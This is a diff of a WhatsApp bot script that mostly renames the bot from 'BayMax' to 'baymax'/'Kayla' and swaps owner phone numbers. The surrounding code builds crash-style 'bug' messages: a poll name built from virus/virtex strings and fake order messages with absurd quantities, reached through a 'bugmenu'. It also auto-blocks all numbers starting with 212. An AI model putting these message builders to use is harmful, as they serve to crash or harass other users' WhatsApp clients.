@@ -52,12 +52,12 @@ chats: {},
 ...(global.db || {})
 }
 
-module.exports = BayMax = async (BayMax, m, chatUpdate, store) => {
+module.exports = baymax = async (baymax, m, chatUpdate, store) => {
 try {
         const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
         const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
         const budy = (typeof m.text == 'string' ? m.text : '')
-        const prefix = /^[��?�С¡�????�????_=|~!?#$%^&.+-,\/\\?^]/.test(body) ? body.match(/^[��?�С¡�????�????_=|~!?#$%^&.+-,\/\\?^]/gi) : '#'
+        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
         const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
         const content = JSON.stringify(m.message)
         const { type, quotedMsg, mentioned, now, fromMe } = m
@@ -66,8 +66,8 @@ try {
         const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
-        const botNumber = await BayMax.decodeJid(BayMax.user.id)
-        const itsMeBayMax = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const botNumber = await baymax.decodeJid(baymax.user.id)
+        const itsMeKayla = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
@@ -112,15 +112,15 @@ try {
         const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
         const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
         const UltahCreator = new Date('Januari 19, 2023 00:00:00')
-        const CreatorGustiPanenggah = new Date().getTime()
-        const BayMaxWA = UltahCreator - CreatorGustiPanenggah
-        const BayMaxhari = Math.floor( BayMaxWA / (1000 * 60 * 60 * 24));
-        const BayMaxjam = Math.floor( BayMaxWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
-        const BayMaxmenit = Math.floor( BayMaxWA % (1000 * 60 * 60) / (1000 * 60))
-        const BayMaxdetik = Math.floor( BayMaxWA % (1000 * 60) / 1000)
+        const CreatorKayla = new Date().getTime()
+        const KaylaBotWA = UltahCreator - CreatorKayla
+        const kayhari = Math.floor( KaylaBotWA / (1000 * 60 * 60 * 24));
+        const kayjam = Math.floor( KaylaBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
+        const kaymenit = Math.floor( KaylaBotWA % (1000 * 60 * 60) / (1000 * 60))
+        const kaydetik = Math.floor( KaylaBotWA % (1000 * 60) / 1000)
         const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
         const senderNumber = sender.split('@')[0]
-        const groupMetadata = m.isGroup ? await BayMax.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = m.isGroup ? await baymax.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
@@ -131,7 +131,7 @@ try {
     	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     	const isPrem = prem.includes(sender)
     	const isUser = pendaftar.includes(sender)
-    	const banUser = await BayMax.fetchBlocklist()
+    	const banUser = await baymax.fetchBlocklist()
         const isBanned = banUser ? banUser.includes(m.sender) : false
     	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
     	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
@@ -157,7 +157,7 @@ afkReason: '',
 console.error(err)
 }
 
-if (!BayMax.public) {
+if (!baymax.public) {
 if (!m.key.fromMe) return
 }
 
@@ -173,7 +173,7 @@ var mde = ['red','green','yellow','blue','magenta','cyan','white']
 var halale = mde[Math.floor(Math.random() * mde.length)]
 
 if (isCmd) {
-console.log(chalk.yellow.bgCyan.bold(' - ????? ??? '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
+console.log(chalk.yellow.bgCyan.bold(' - 𝙺𝚊𝚢𝚕𝚊 𝙱𝚘𝚝 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
 }
 
 if (isCmd && !isUser) {
@@ -183,15 +183,15 @@ fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
 
 if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
 console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
-return m.reply('�� ? ��Sabar Bang 5 Detik/Command')
+return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command')
 }
         
 if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
 console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
-return m.reply('�� ? ��Sabar Bang 5 Detik/Command')
+return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command')
 }
 
-if (isCmd && !itsMeBayMax) antiSpam.addFilter(from)
+if (isCmd && !itsMeKayla) antiSpam.addFilter(from)
 
 for (let jid of mentionUser) {
 let user = global.db.users[jid]
@@ -215,30 +215,30 @@ user.afkTime = -1
 user.afkReason = ''
 }
 
-if (m.sender.startsWith('212')) return BayMax.updateBlockStatus(m.sender, 'block')
-if (m.key.remoteJid == 'status@broadcast') return BayMax.sendReadReceipt(from, m.sender, [m.key.id])
+if (m.sender.startsWith('212')) return baymax.updateBlockStatus(m.sender, 'block')
+if (m.key.remoteJid == 'status@broadcast') return baymax.sendReadReceipt(from, m.sender, [m.key.id])
 
 async function sendKaylaMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
     if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
     if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
-    return await BayMax.relayMessage(chatId, generate.message, { messageId: generate.key.id })
+    return await baymax.relayMessage(chatId, generate.message, { messageId: generate.key.id })
 }
 
 const sendSticker = (pesan) => {
-BayMax.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
+baymax.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
 }
 
 try {
-ppuser = await BayMax.profilePictureUrl(m.sender, 'image')
+ppuser = await baymax.profilePictureUrl(m.sender, 'image')
 } catch (err) {
 ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
 }
 ppnyauser = await reSize(ppuser, 300, 300)
 
 const sendvn = (teks) => {
-BayMax.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+baymax.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
 }
 
 for (let anju of vnnye) {
@@ -257,7 +257,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `BayMax  WhatsApp`, 
+"caption": `baymax Bot WhatsApp`, 
 "jpegThumbnail": ppnyauser
 }
 }
@@ -268,7 +268,7 @@ key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...(from ? {
-remoteJid: '6281390368580@s.whatsapp.net' } : {}) }, 
+remoteJid: '6287705048235@s.whatsapp.net' } : {}) }, 
 message: { 
 extendedTextMessage: { 
 text: `${m.pushName}`, 
@@ -295,7 +295,7 @@ sellerJid: '0@s.whatsapp.net'
 };
 
 const reply = (teks) => {
-BayMax.sendMessage(from, { text: teks ,
+baymax.sendMessage(from, { text: teks ,
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
@@ -304,7 +304,7 @@ isForwarded: true
 }
 
 const banRep = () => {
-BayMax.sendMessage(m.chat, {
+baymax.sendMessage(m.chat, {
 text:`Maaf Anda Sudah Di Banned Silahkan Chat @${creator.split("@")[0]} Untuk Membuka Nya`,
 mentions: [creator],
 },
@@ -331,18 +331,18 @@ participant: `0@s.whatsapp.net`,
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `BayMax  WhatsApp${ngazap(prefix)}`,
+"fileName": `baymax Bot WhatsApp${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 
 let list = []
 for (let i of owner) {
 list.push({
-displayName: await BayMax.getName(i + '@s.whatsapp.net'),
+displayName: await baymax.getName(i + '@s.whatsapp.net'),
 vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
-N:${await BayMax.getName(i + '@s.whatsapp.net')}\n
-FN:${await BayMax.getName(i + '@s.whatsapp.net')}\n
+N:${await baymax.getName(i + '@s.whatsapp.net')}\n
+FN:${await baymax.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
@@ -363,7 +363,7 @@ participant: `0@s.whatsapp.net`,
 },
 "message": {
 "pollCreationMessage": {
-"name": `BayMax  ${virus}${virtex(prefix)}`,
+"name": `baymax Bot ${virus}${virtex(prefix)}`,
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -378,7 +378,7 @@ participant: `0@s.whatsapp.net`,
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI BayMax "
+"optionName": "SALAM DARI baymax BOT"
 	}
 ],
 "selectableOptionsCount": 5
@@ -388,7 +388,7 @@ const repPy = {
 	key: {
 		remoteJid: '0@s.whatsapp.net',
 		fromMe: false,
-		id: 'BayMax ',
+		id: 'baymax Bot',
 		participant: '0@s.whatsapp.net'
 	},
 	message: {
@@ -398,7 +398,7 @@ const repPy = {
 			requestFrom: '0@s.whatsapp.net',
 			noteMessage: {
 				extendedTextMessage: {
-					text: 'Creator BayMax'
+					text: 'Creator baymax'
 				}
 			},
 			expiryTimestamp: 999999999,
@@ -440,9 +440,9 @@ participant: `0@s.whatsapp.net`,
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `BayMax  WhatsApp${ngazap(prefix)}`,
-"orderTitle": "BayMax  WhatsApp${ngazap(prefix)}",
-"sellerJid": "6281390368580@s.whatsapp.net",
+"message": `baymax Bot WhatsApp${ngazap(prefix)}`,
+"orderTitle": "baymax Bot WhatsApp${ngazap(prefix)}",
+"sellerJid": "6287705048235@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -452,8 +452,8 @@ let rn = ['recording','composing']
 let jd = rn[Math.floor(Math.random() * rn.length)];
 
 if (command) {
-BayMax.sendPresenceUpdate(jd, from)
-BayMax.readMessages([m.key])
+baymax.sendPresenceUpdate(jd, from)
+baymax.readMessages([m.key])
 }
 
 function simpan(path, buff) {
@@ -477,7 +477,7 @@ console.log(color('Download Video With ytdl-core'))
 let nana = ytdl(Link)
 .pipe(fs.createWriteStream(mp4File))
 .on('finish', async () => {
-await BayMax.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
+await baymax.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
 fs.unlinkSync(`./${mp4File}`)
 })
 } catch (err) {
@@ -493,7 +493,7 @@ console.log(color('Download Audio With ytdl-core'))
 ytdl(Link, { filter: 'audioonly' })
 .pipe(fs.createWriteStream(mp3File))
 .on('finish', async () => {
-await BayMax.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
+await baymax.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
 fs.unlinkSync(mp3File)
 })
 } catch (err) {
@@ -502,7 +502,7 @@ reply(`${err}`)
 }
 
 async function sendPoll(jid, text, list) {
-BayMax.relayMessage(jid, {
+baymax.relayMessage(jid, {
 "pollCreationMessage": {
 "name": text,
 "options": list.map(v => { return { optionName: v } }),
@@ -512,7 +512,7 @@ BayMax.relayMessage(jid, {
 }
 
 async function bygbt(text) {
-BayMax.sendMessage(text, {
+baymax.sendMessage(text, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -524,38 +524,38 @@ templateButtons: [
 ]})
 }
 
-const BayMax = "6281390368580@s.whatsapp.net"
+const botzkayla = "6287705048235@s.whatsapp.net"
 const mark = "0@s.whatsapp.net"
 const timestamp = speed()
 const latensi = speed() - timestamp
 const butlocNye = [
-{buttonId: `${prefix}owner`, buttonText: {displayText: '?????'}, type: 1},
-{buttonId: `${prefix}sewabot`, buttonText: {displayText: '???????'}, type: 1}
+{buttonId: `${prefix}owner`, buttonText: {displayText: '𝗢𝗪𝗡𝗘𝗥'}, type: 1},
+{buttonId: `${prefix}sewabot`, buttonText: {displayText: '𝗦𝗘𝗪𝗔𝗕𝗢𝗧'}, type: 1}
 ]
 const buttonLocnya = {
 location: { jpegThumbnail: ppnyauser } ,
 caption: `Hai Kak @${sender.split("@")[0]} 
-???? ?????? ??? ???????? ???? ???? ???????? ???? ??????? ???????, ???????? ?????/????? ??????, ???????? ?????/????? ???????, ??????? ???? ???? ???/????????/??????360, ??? ????-????.
+𝘚𝘢𝘺𝘢 BayMax 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.
 
-Nama ${itsMeBayMax ? 'Owner' : 'User'} : ${pushname}
-Nomor ${itsMeBayMax ? 'Owner' : 'User'} : ${sender.split("@")[0]}
+Nama ${itsMeKayla ? 'Owner' : 'User'} : ${pushname}
+Nomor ${itsMeKayla ? 'Owner' : 'User'} : ${sender.split("@")[0]}
 Jumlah User : ${pendaftar.length} User
-Status : ${itsMeBayMax ? 'Owner' : 'User'}
+Status : ${itsMeKayla ? 'Owner' : 'User'}
 Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
-Runtime  : ${runtime(process.uptime())}
-Speed  : ${latensi.toFixed(4)} ?????
-Otw Tahun Baru : ${jhari} ???? ${jjam} ??? ${jmenit} ????? ${jdetik} ?????
-Otw Idul Fitri : ${hahari} ???? ${hajam} ??? ${hamenit} ????? ${hadetik} ?????
-Otw Idul Adha : ${hihari} ???? ${hijam} ??? ${himenit} ????? ${hidetik} ?????
-Otw Ultah Creator : ${BayMaxhari} ???? ${BayMaxjam} ??? ${kaymenit} ????? ${BayMaxdetik} ?????
+Runtime Bot : ${runtime(process.uptime())}
+Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
+Otw Tahun Baru : ${jhari} 𝑯𝒂𝒓𝒊 ${jjam} 𝑱𝒂𝒎 ${jmenit} 𝑴𝒆𝒏𝒊𝒕 ${jdetik} 𝑫𝒆𝒕𝒊𝒌
+Otw Idul Fitri : ${hahari} 𝑯𝒂𝒓𝒊 ${hajam} 𝑱𝒂𝒎 ${hamenit} 𝑴𝒆𝒏𝒊𝒕 ${hadetik} 𝑫𝒆𝒕𝒊𝒌
+Otw Idul Adha : ${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊𝒌
+Otw Ultah Creator : ${kayhari} 𝑯𝒂𝒓𝒊 ${kayjam} 𝑱𝒂𝒎 ${kaymenit} 𝑴𝒆𝒏𝒊𝒕 ${kaydetik} 𝑫𝒆𝒕𝒊𝒌
 
-?????? ??
-?????? ???
-????? ???
-????? ?????????
-???? ???????`,
-mentions : [sender, BayMax, mark],
-footer: `Created By @${BayMax.split("@")[0]}
+𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼
+𝗔𝗹𝗹𝗮𝗵 𝗦𝗪𝗧
+𝗢𝗿𝗮𝗻𝗴 𝗧𝘂𝗮
+*Gusti Panengah*
+𝗨𝘀𝗲𝗿 𝗕𝗼𝘁`,
+mentions : [sender, botzkayla, mark],
+footer: `Created By @${botzkayla.split("@")[0]}
 WhatsApp By @${mark.split("@")[0]}`,
 buttons: butlocNye,
 headerType: "LOCATION"
@@ -603,7 +603,7 @@ async function sendFile(jid, media, options={}) {
         else if (mime == "webp") type = "sticker"
         else if (mime == "mp4") type = "video"
         else type = "document"
-        return BayMax.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
+        return baymax.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
       }
 
 async function ephoto(url, texk) {
@@ -647,23 +647,23 @@ let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", 
 return build_server + data.image
 }
 
-async?function?genProfile(BayMax,?m)?{
- ??let?font?=?await?Jimp.loadFont('./name.fnt'), 
- ????mask?=?await?Jimp.read('https://i.imgur.com/552kzaW.png'), 
- ????welcome?=?await?Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
- ????avatar?=?await?Jimp.read(await?BayMax.profilePictureUrl(m.sender,?'image').catch(()?=>?'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
- ????status?=?(await?BayMax.fetchStatus(m.sender).catch(console.log)?||?{}).status?.slice(0,?30)?||?'Not?Detected' 
- ????await?avatar.resize(460,?460) 
- ????await?mask.resize(460,?460) 
- ????await?avatar.mask(mask) 
- ????await?welcome.resize(welcome.getWidth(),?welcome.getHeight()) 
- ????await?welcome.print(font,?550,?180,?'Nama:') 
- ????await?welcome.print(font,?650,?255,?m.pushName.slice(0,?25)) 
- ????await?welcome.print(font,?550,?340,?'Bio:') 
- ????await?welcome.print(font,?650,?415,?status) 
- ????await?welcome.print(font,?550,?500,?'Nomor:') 
- ????await?welcome.print(font,?650,?575,?PhoneNumber('+'?+?m.sender.split('@')[0]).getNumber('international')) 
- ????return?await?welcome.composite(avatar,?50,?170).getBufferAsync('image/png') 
+async function genProfile(baymax, m) {
+   let font = await Jimp.loadFont('./name.fnt'), 
+     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
+     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
+     avatar = await Jimp.read(await baymax.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
+     status = (await baymax.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
+     await avatar.resize(460, 460) 
+     await mask.resize(460, 460) 
+     await avatar.mask(mask) 
+     await welcome.resize(welcome.getWidth(), welcome.getHeight()) 
+     await welcome.print(font, 550, 180, 'Nama:') 
+     await welcome.print(font, 650, 255, m.pushName.slice(0, 25)) 
+     await welcome.print(font, 550, 340, 'Bio:') 
+     await welcome.print(font, 650, 415, status) 
+     await welcome.print(font, 550, 500, 'Nomor:') 
+     await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
+     return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
 }
 
 async function quotesanime () {
@@ -766,7 +766,7 @@ async function obfus(query) {
         );
         const result = {
             status: 200,
-            author: `BayMax`,
+            author: `baymax`,
             result: obfuscationResult.getObfuscatedCode()
         }
         resolve(result)
@@ -858,21 +858,21 @@ footerText: footer,
 }
 }
 let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
-return BayMax.relayMessage(progene.key.remoteJid, progene.message, {
+return baymax.relayMessage(progene.key.remoteJid, progene.message, {
 messageId: ""
 })
 }
 
 async function replyprem(teks) {
     let buttons = [
-    { buttonId: '.buypremium', buttonText: { displayText: '?? Upgrade Premium' }, type: 1 }
+    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
     ]
-    return BayMax.sendButtonText(m.chat, buttons, teks, `Jangan Mau Free Yah :(`, m)
+    return baymax.sendButtonText(m.chat, buttons, teks, `Jangan Mau Free Yah :(`, m)
 }
 
 if (/hehe/g.test(m.body)) {
 let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-BayMax.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
+baymax.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
 }
 
 if (autodltt) {
@@ -883,48 +883,48 @@ let buttons = [
 { buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
 { buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
 ]
-await BayMax.sendButtonText(m.chat, buttons, `Auto Download Tiktok
+await baymax.sendButtonText(m.chat, buttons, `Auto Download Tiktok
 
-Title : ${atdl.title}`, `Auto Downloader By BayMax`, ftext)
+Title : ${atdl.title}`, `Auto Downloader By baymax`, ftext)
 }
 }
 
 if (autosticker) {
 if (/image/.test(mime) && !/webp/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await BayMax.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await baymax.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime) && !/webp/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
 let media = await quoted.download()
-let encmedia = await BayMax.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await baymax.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMeBayMax && antilink) {
+if (m.isGroup && !m.key.fromMe && !itsMeKayla && antilink) {
 if (!isBotAdmins) return
 if (budy.match(`chat.whatsapp.com`)) {
-BayMax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
-BayMax.groupParticipantsUpdate(m.chat, [sender], 'remove')
+baymax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
+baymax.groupParticipantsUpdate(m.chat, [sender], 'remove')
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMeBayMax && antiwame) {
+if (m.isGroup && !m.key.fromMe && !itsMeKayla && antiwame) {
 if (!isBotAdmins) return
 if (budy.match(`wa.me`)) {
-BayMax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
-BayMax.groupParticipantsUpdate(m.chat, [sender], 'remove')
+baymax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
+baymax.groupParticipantsUpdate(m.chat, [sender], 'remove')
 }
 }
 
 if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
 var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
 if (get_data_respon.isImage === false) {
-BayMax.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
+baymax.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
 } else {
 buff = await getBuffer(get_data_respon.image_url)
-BayMax.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
+baymax.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
 }
 }
 
@@ -935,57 +935,57 @@ return Math.floor(angka)
 if (!isCmd && isAlreadykaylaList(chath, dblist)) {
 var getkaydata = getDatakaylaList(chath, dblist)
 if (getkaydata.isImage === false) {
-BayMax.sendMessage(m.chat, { text: sendkaylaList(chath, dblist) }, { quoted: m })
+baymax.sendMessage(m.chat, { text: sendkaylaList(chath, dblist) }, { quoted: m })
 } else {
 buff = await getBuffer(getkaydata.image_url)
-BayMax.sendImage(m.chat, buff, `${getkaydata.response}`, m)
+baymax.sendImage(m.chat, buff, `${getkaydata.response}`, m)
 }
 }
 
 const seactions = [{
-title: `???????? ????? ?? ?????`,
+title: `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇`,
 rows: [
-{title: `??? ????`, rowId: `${prefix}allmenu`},
-{title: `????? ????`, rowId: `${prefix}ownermenu`},
-{title: `????? ????`, rowId: `${prefix}othermenu`},
-{title: `???????? ????`, rowId: `${prefix}downloadmenu`},
-{title: `??? ????`, rowId: `${prefix}bugmenu`},
-{title: `????? ????`, rowId: `${prefix}groupmenu`},
-{title: `??? ????`, rowId: `${prefix}funmenu`},
-{title: `??????? ????`, rowId: `${prefix}stalkermenu`},
-{title: `???? ????`, rowId: `${prefix}randfotomenu`},
-{title: `????? ????`, rowId: `${prefix}randvideomenu`},
-{title: `???? ??? ????`, rowId: `${prefix}textpromenu`},
-{title: `????? ??? ????`, rowId: `${prefix}photooxymenu`},
-{title: `?????? ??? ????`, rowId: `${prefix}ephoto360menu`},
-{title: `?????? ????`, rowId: `${prefix}cerpenmenu`},
+{title: `⊟ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨`, rowId: `${prefix}allmenu`},
+{title: `⊟ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 _baymax_`, rowId: `${prefix}ownermenu`},
+{title: `⊟ 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 _baymax_`, rowId: `${prefix}othermenu`},
+{title: `⊟ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨`, rowId: `${prefix}downloadmenu`},
+{title: `⊟ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨`, rowId: `${prefix}bugmenu`},
+{title: `⊟ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨`, rowId: `${prefix}groupmenu`},
+{title: `⊟ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨`, rowId: `${prefix}funmenu`},
+{title: `⊟ 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘𝗡𝗨`, rowId: `${prefix}stalkermenu`},
+{title: `⊟ 𝗙𝗢𝗧𝗢 𝗠𝗘𝗡𝗨`, rowId: `${prefix}randfotomenu`},
+{title: `⊟ 𝗩𝗜𝗗𝗘𝗢 𝗠𝗘𝗡𝗨`, rowId: `${prefix}randvideomenu`},
+{title: `⊟ 𝗧𝗘𝗫𝗧 𝗣𝗥𝗢 𝗠𝗘𝗡𝗨`, rowId: `${prefix}textpromenu`},
